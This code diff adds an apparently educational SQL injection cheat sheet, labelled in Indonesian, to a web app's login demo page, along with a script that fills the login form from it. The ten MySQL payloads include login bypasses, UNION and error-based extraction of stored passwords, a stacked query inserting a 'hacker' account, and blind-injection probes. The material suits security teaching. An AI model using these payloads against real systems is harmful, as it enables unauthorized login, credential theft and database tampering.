@@ -23,7 +23,7 @@
         background-color: var(--bg-danger-subtle);
         border-color: var(--brand-danger-glow);
     }
-    
+
     .verdict-banner .vb-title { font-size: 1.15rem; font-weight: 700; }
     .verdict-banner .vb-sub { color: var(--text-secondary); font-size: 0.88rem; margin-top: 6px; }
 
@@ -190,7 +190,7 @@
                     <div class="ts-time">{{ g.sqli_metrics.network_ms | round(3) }} ms</div>
                 </div>
                 {% endif %}
-                
+
                 <div class="telemetry-step">
                     <div class="ts-icon">🧹</div>
                     <div class="ts-info">
@@ -222,7 +222,7 @@
                 </div>
                 {% endif %}
             </div>
-            
+
             <!-- Sent Input Section -->
             {% if g.sqli_metrics and (g.sqli_metrics.username_val or g.sqli_metrics.password_val) %}
             <div class="mt-4 pt-3" style="border-top: 1px dashed rgba(255, 255, 255, 0.1);">
@@ -348,9 +348,74 @@
     </div>
 </div>
 
+<!-- SQLi cheatsheet -->
+<div class="card">
+  <div class="card-header hdr-blue">
+    <strong>Daftar Payload SQL Injection (Referensi Akademik)</strong>
+    <span
+      style="font-size: 0.75rem; color: var(--text-secondary); font-weight: 400"
+      >Kategori MySQL &bull; Klik <em>Gunakan</em> untuk menyalin payload ke form</span
+    >
+  </div>
+  <div class="card-body pt-2 pb-2">
+    {% set cheats = [
+      ( "Error Based", "Memancing error XML parsing untuk menampilkan data sensitif", "' AND updatexml(1,concat(0x3a,(SELECT password FROM users LIMIT 1)),1) -- ", "x", "", "Memicu error UpdateXML yang menampilkan isi field password." ),
+      ( "Illegal Query", "Menjalankan query dengan sintaks tidak valid / illegal", "' OR (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b) -- ", "x", "", "Memicu error subquery atau join yang tidak valid." ),
+      ( "Union Based", "Menggabungkan hasil query asli dengan query SELECT tambahan", "' UNION SELECT 1, username, password FROM users -- ", "x", "", "Mengekstrak data dari tabel users secara langsung ke layar." ),
+      ( "Tautology", "Menggunakan kondisi logika OR yang selalu bernilai TRUE", "' OR '1'='1' -- ", "x", "", "Bypass login karena kueri menghasilkan nilai TRUE." ),
+      ( "Stored Procedure", "Memanggil fungsi atau prosedur bawaan database engine", "admin'; CALL sys.ps_setup_reload_saved() -- ", "x", "", "Mengeksekusi stored procedure bawaan database MySQL." ),
+      ( "End-of-Line Comment", "Memotong sisa kueri password menggunakan tanda komentar", "admin' -- ", "x", "", "Mengabaikan verifikasi password dengan memotong sisa query." ),
+      ( "Inline Comments", "Menggunakan komentar inline /**/ untuk memanipulasi parsing", "admin'/**/OR/**/'1'='1", "x", "", "Mengelabui pemrosesan parser atau WAF menggunakan inline comments." ),
+      ( "Stacked Queries", "Menjalankan banyak kueri SQL menggunakan pemisah titik koma", "admin'; INSERT INTO users (username, password) VALUES ('hacker', 'hacker123'); -- ", "x", "", "Menambahkan kueri INSERT baru setelah kueri login." ),
+      ( "Time-based blind", "Mengetahui status kondisi logika via delay respon (sleep)", "' AND IF(1=1, sleep(5), 0) -- ", "x", "", "Menunda respon server selama 5 detik jika kondisi bernilai benar." ),
+      ( "Boolean-Based Blind", "Menguji logika kondisi BENAR/SALAH untuk menebak data", "' AND (SELECT 1 FROM users WHERE username='admin')='1' -- ", "x", "", "Memeriksa apakah user 'admin' ada dengan mengamati respon sukses." )
+    ] %}
+    {% for name, desc, payload_user, payload_pass, badge, note in cheats %}
+    <div class="cheat-item">
+      <div class="cheat-header">
+        <div class="cheat-meta">
+          <span class="badge-tech">{{ name }}</span>
+          {% if badge %}<span class="field-tag">{{ badge }}</span>{% endif %}
+          <span style="color: var(--text-secondary); font-size: 0.78rem"
+            >{{ desc }}</span
+          >
+        </div>
+        <button
+          class="try-btn js-cheat-btn"
+          type="button"
+          data-username="{{ payload_user }}"
+          data-password="{{ payload_pass }}"
+        >
+          Gunakan
+        </button>
+      </div>
+      <pre
+        class="cheat-pre"
+      ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">{{ payload_user }}</span><span class="qs">' AND password = '</span><span class="qi" style="color: var(--brand-warning);">{{ payload_pass }}</span><span class="qs">'</span></pre>
+      {% if note %}
+      <div class="note-tag">{{ note }}</div>
+      {% endif %}
+    </div>
+    {% endfor %}
+  </div>
+</div>
 {% endblock %}
 
 {% block scripts %}
+<script>
+  (function () {
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+
+    document.querySelectorAll(".js-cheat-btn").forEach((button) => {
+      button.addEventListener("click", () => {
+        usernameInput.value = button.dataset.username || "";
+        passwordInput.value = button.dataset.password || "";
+        usernameInput.focus();
+      });
+    });
+  })();
+</script>
 <script>
     document.addEventListener("DOMContentLoaded", function() {
         var form = document.getElementById('loginForm');
